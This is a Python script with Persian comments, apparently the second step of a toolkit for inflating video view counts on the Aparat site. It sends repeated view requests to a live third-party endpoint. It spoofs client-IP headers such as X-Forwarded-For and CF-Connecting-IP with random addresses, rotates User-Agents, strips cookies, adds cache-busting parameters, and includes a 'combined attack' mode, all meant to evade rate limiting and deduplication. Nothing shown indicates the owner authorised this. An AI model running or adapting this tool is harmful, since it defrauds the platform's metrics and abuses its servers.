#!/usr/bin/env python3
"""
Step 2 - Fake View Bypass Testing
هدف: بررسی اینکه آیا rate limiting یا deduplication ضعیف داره

تست‌هایی که انجام میده:
  T1 - بدون تغییر، چند بار view ارسال
  T2 - X-Forwarded-For spoofing
  T3 - User-Agent rotation
  T4 - Referer manipulation
  T5 - Cookie/session stripping
  T6 - HTTP method variation
  T7 - Header field manipulation (CF-Connecting-IP, True-Client-IP, ...)
"""

import requests
import time
import json
import random
import string
import sys
from dataclasses import dataclass, field
from typing import Optional

# ===== CONFIG =====
VIEW_ENDPOINT = ""   # از step1 پیدا کن، مثال: /video/video/addview/videohash/XXXXX
VIDEO_HASH    = ""   # hash ویدیو
BASE_URL      = "https://www.aparat.com"
DELAY_BETWEEN = 0.5  # ثانیه — خیلی aggressive نباش

# اگه endpoint نیاز به session/cookie داشت اینجا بذار
COOKIES = {}  # {"PHPSESSID": "...", ...}
# =================

FAKE_IPS = [
    "1.1.1.1", "8.8.8.8", "185.{}.{}.{}".format(
        random.randint(1,254), random.randint(1,254), random.randint(1,254)
    ),
    "10.0.0.{}".format(random.randint(1,254)),
    "192.168.1.{}".format(random.randint(1,254)),
    "172.16.{}.{}".format(random.randint(0,31), random.randint(1,254)),
]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15",
    "Mozilla/5.0 (Android 14; Mobile; rv:125.0) Gecko/125.0 Firefox/125.0",
    "Dalvik/2.1.0 (Linux; U; Android 14; Pixel 8 Build/UD1A)",
]

@dataclass
class TestResult:
    name: str
    responses: list = field(default_factory=list)
    note: str = ""

def send_view(session: requests.Session, extra_headers: dict = {},
              params: dict = {}, method: str = "GET") -> requests.Response:
    url = BASE_URL + VIEW_ENDPOINT
    try:
        if method == "POST":
            r = session.post(url, json=params or {"videohash": VIDEO_HASH},
                           headers=extra_headers, timeout=15)
        else:
            r = session.get(url, params=params, headers=extra_headers, timeout=15)
        return r
    except Exception as e:
        print(f"      [ERR] {e}")
        return None

def make_session(ua: str = None, cookies: dict = None) -> requests.Session:
    s = requests.Session()
    s.headers.update({
        "User-Agent": ua or USER_AGENTS[0],
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "fa-IR,fa;q=0.9,en;q=0.8",
        "Referer": f"https://www.aparat.com/v/{VIDEO_HASH}",
        "Origin": "https://www.aparat.com",
    })
    if cookies:
        s.cookies.update(cookies)
    elif COOKIES:
        s.cookies.update(COOKIES)
    return s

def extract_view_count(response: requests.Response) -> Optional[int]:
    if not response:
        return None
    try:
        data = response.json()
        # سعی کن view count رو از response پیدا کن
        for key in ['view_cnt', 'viewCnt', 'view_count', 'views', 'cnt']:
            if key in data:
                return int(data[key])
        # اگه nested بود
        for k, v in data.items():
            if isinstance(v, dict):
                for key in ['view_cnt', 'viewCnt', 'view_count', 'views']:
                    if key in v:
                        return int(v[key])
    except:
        pass
    return None

def print_result(r: requests.Response, label: str = ""):
    if not r:
        print(f"      [{label}] No response")
        return
    view = extract_view_count(r)
    view_str = f" | views={view}" if view else ""
    print(f"      [{label}] {r.status_code}{view_str} | {r.text[:150]}")

# -------------------------------------------------------
def T1_baseline(n: int = 5):
    """Baseline: همون session، همون IP، n بار"""
    print(f"\n[T1] Baseline - {n} requests, same session")
    s = make_session()
    for i in range(n):
        r = send_view(s)
        print_result(r, f"req {i+1}")
        time.sleep(DELAY_BETWEEN)

def T2_ip_spoofing(n: int = 10):
    """X-Forwarded-For و header های مشابه"""
    print(f"\n[T2] IP Header Spoofing - {n} fake IPs")
    ip_headers = [
        "X-Forwarded-For",
        "X-Real-IP",
        "CF-Connecting-IP",
        "True-Client-IP",
        "X-Client-IP",
        "X-Cluster-Client-IP",
        "Forwarded",
    ]

    s = make_session()
    for i in range(n):
        fake_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
        headers = {h: fake_ip for h in ip_headers}
        headers["Forwarded"] = f"for={fake_ip}"
        r = send_view(s, extra_headers=headers)
        print_result(r, f"IP={fake_ip}")
        time.sleep(DELAY_BETWEEN)

def T3_ua_rotation(n: int = 6):
    """User-Agent rotation با session جدید هر بار"""
    print(f"\n[T3] User-Agent Rotation - fresh session each time")
    for i, ua in enumerate(USER_AGENTS[:n]):
        s = make_session(ua=ua)
        r = send_view(s)
        print_result(r, f"UA={ua[:50]}")
        time.sleep(DELAY_BETWEEN)

def T4_no_cookie(n: int = 3):
    """بدون cookie - شاید session tracking نداشته باشه"""
    print(f"\n[T4] No cookies / stripped session")
    for i in range(n):
        s = requests.Session()
        s.headers.update({
            "User-Agent": random.choice(USER_AGENTS),
            "Referer": f"https://www.aparat.com/v/{VIDEO_HASH}",
        })
        r = send_view(s)
        print_result(r, f"no-cookie {i+1}")
        time.sleep(DELAY_BETWEEN)

def T5_combined(n: int = 20):
    """ترکیب همه: IP spoof + UA rotation + session جدید"""
    print(f"\n[T5] Combined attack - {n} requests")
    ip_headers = ["X-Forwarded-For", "X-Real-IP", "CF-Connecting-IP", "True-Client-IP"]

    for i in range(n):
        fake_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
        ua = random.choice(USER_AGENTS)
        s = make_session(ua=ua)

        headers = {h: fake_ip for h in ip_headers}
        r = send_view(s, extra_headers=headers)
        view = extract_view_count(r)
        status = r.status_code if r else "ERR"
        print(f"      [req {i+1:02d}] status={status} views={view} ip={fake_ip}")
        time.sleep(DELAY_BETWEEN)

def T6_method_variation():
    """تست POST vs GET vs PUT"""
    print(f"\n[T6] HTTP Method Variation")
    s = make_session()
    for method in ["GET", "POST", "PUT"]:
        r = send_view(s, method=method)
        print_result(r, f"method={method}")
        time.sleep(DELAY_BETWEEN)

def T7_cache_buster(n: int = 10):
    """Cache buster - پارامتر random اضافه کردن"""
    print(f"\n[T7] Cache buster params")
    s = make_session()
    for i in range(n):
        bust = ''.join(random.choices(string.ascii_lowercase, k=8))
        params = {"_": bust, "t": str(int(time.time() * 1000))}
        r = send_view(s, params=params)
        print_result(r, f"bust={bust}")
        time.sleep(DELAY_BETWEEN)

# -------------------------------------------------------
if __name__ == "__main__":
    if not VIEW_ENDPOINT or not VIDEO_HASH:
        print("[!] CONFIG رو پر کن!")
        print("[!] VIEW_ENDPOINT و VIDEO_HASH باید set بشن")
        print("[!] اول step1_recon.py رو اجرا کن تا endpoint پیدا بشه")
        sys.exit(1)

    print(f"[*] Target: {BASE_URL}{VIEW_ENDPOINT}")
    print(f"[*] Video: {VIDEO_HASH}")
    print("[*] شروع تست‌ها...\n")

    # ترتیب تست از کم‌خطر به پر‌خطر
    T1_baseline(n=3)
    T4_no_cookie(n=3)
    T2_ip_spoofing(n=5)
    T3_ua_rotation()
    T7_cache_buster(n=5)
    T6_method_variation()
    # T5 آخر - بیشترین request
    # T5_combined(n=20)

    print("\n[*] Done. نتایج رو آنالیز کن:")
    print("  - اگه view count بالا رفت: vulnerable!")
    print("  - اگه 429 گرفتی: rate limiting داره ولی شاید قابل bypass باشه")
    print("  - اگه همه 200 برگشت ولی count نچرخید: server-side dedup داره")
